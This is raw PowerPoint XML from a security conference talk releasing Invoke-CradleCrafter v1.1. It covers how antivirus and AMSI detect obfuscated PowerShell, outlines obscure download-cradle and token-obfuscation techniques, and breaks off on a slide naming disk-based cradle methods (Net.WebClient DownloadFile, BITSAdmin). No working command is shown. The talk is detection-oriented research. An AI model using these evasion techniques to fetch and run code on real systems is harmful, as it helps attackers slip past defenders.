            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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19308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smtClean="0"/>
              <a:t>Current State of PowerShell Obfuscation Detection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1" y="1825625"/>
            <a:ext cx="6850810" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>A/V still not detecting commands or scripts obfuscated with Invoke-Obfuscation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Note: obfuscation does not alter heuristics</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(e.g. powershell.exe accessing lsass.exe)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Some competitors have updated command line detection for some basic obfuscation techniques </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>A lot has changed since v1.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Numerous threat actors are </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>using Invoke-Obfuscation, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>including most recently </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APT32</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Vietnamese attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(aka </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>OceanLotus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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60792" y="1296539"/>
            <a:ext cx="3435344" cy="444314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319623" y="5739682"/>
            <a:ext cx="62958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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>www.pngall.com/wp-content/uploads/2016/05/Vietnam-Flag-PNG.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>s-media-cache-ak0.pinimg.com/736x/57/09/95/570995b4876016332cfc476f81a4341a.jpg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7828" y="3945065"/>
            <a:ext cx="2513161" cy="1884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78787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smtClean="0"/>
              <a:t>Current State of PowerShell Obfuscation Detection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7103285" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>AMSI (Antimalware Scan Interface)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" smtClean="0"/>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>generic interface standard that allows applications and services to integrate with any antimalware product present on a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" smtClean="0"/>
              <a:t>machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Frequency Analysis and Vector Similarity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>://www.leeholmes.com/blog/2016/10/22/more-detecting-obfuscated-powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Lee_Holmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (Microsoft, PowerShell &amp; Azure Teams)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Basis for Black Hat USA 2017 presentation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Revoke-Obfuscation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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60792" y="1296539"/>
            <a:ext cx="3435344" cy="444314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319623" y="5739682"/>
            <a:ext cx="62958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dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>s-media-cache-ak0.pinimg.com/736x/57/09/95/570995b4876016332cfc476f81a4341a.jpg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33873461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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation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Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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47873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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic Cradles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550990" y="2024243"/>
            <a:ext cx="3381554" cy="277779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6500" dirty="0" smtClean="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6500" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6500" dirty="0" smtClean="0"/>
              <a:t>ore"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6500" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="6500" u="sng" dirty="0" smtClean="0"/>
              <a:t>+ "R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6500" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>oar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6500" u="sng" dirty="0" smtClean="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6500" u="sng" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="6500" dirty="0" smtClean="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6500" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MOAR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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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973245" y="6192037"/>
            <a:ext cx="704344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dirty="0"/>
              <a:t>https://img.memesuper.com/dcd8b7ae7cb84f3cc8d7e77de6f57f0b_29280890-moar-cat-meme_500-467.jpeg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0" smtClean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5459" y="1435053"/>
            <a:ext cx="4984382" cy="4655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42943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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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00846" y="1825625"/>
            <a:ext cx="5752954" cy="2866558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2891000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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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22570" y="4033044"/>
            <a:ext cx="8359425" cy="290762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4563555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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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22570" y="4033044"/>
            <a:ext cx="8359425" cy="290762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22570" y="709813"/>
            <a:ext cx="8359425" cy="2278901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10" name="Up Arrow 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8890677" y="3049766"/>
            <a:ext cx="229882" cy="922226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Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5824926" y="3048047"/>
            <a:ext cx="229882" cy="922226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Up Arrow 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7387341" y="3050784"/>
            <a:ext cx="229882" cy="922226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79022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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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09240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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Disk-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" smtClean="0"/>
              <a:t>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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>BITSAdmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(deprecated - c:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>windows\system32\bitsadmin.exe)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
